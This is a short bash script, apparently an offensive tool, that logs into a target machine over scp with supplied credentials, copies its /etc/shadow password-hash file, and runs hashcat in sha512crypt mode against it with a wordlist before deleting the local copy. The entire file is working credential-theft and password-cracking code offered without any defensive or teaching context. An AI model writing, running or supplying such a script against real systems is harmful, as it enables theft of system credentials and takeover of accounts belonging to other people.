#!/bin/bash

# Command: passwd_extract.sh TARGET_IP USERNAME PASSWORD

# Extract password file from the target machine
echo "Extracting password file from $TARGET_IP..."
scp "$USERNAME@$TARGET_IP:/etc/shadow" ./shadow_file

# Check if extraction was successful
if [ $? -ne 0 ]; then
    echo "Failed to extract password file from $TARGET_IP."
    exit 1
fi

echo "Password file extracted successfully."

# Cracking passwords using Hashcat
echo "Starting password cracking..."
hashcat -m 1800 ./shadow_file "$WORDLIST_FILE"

# Clean up extracted files
rm -f ./shadow_file

echo "Password cracking complete."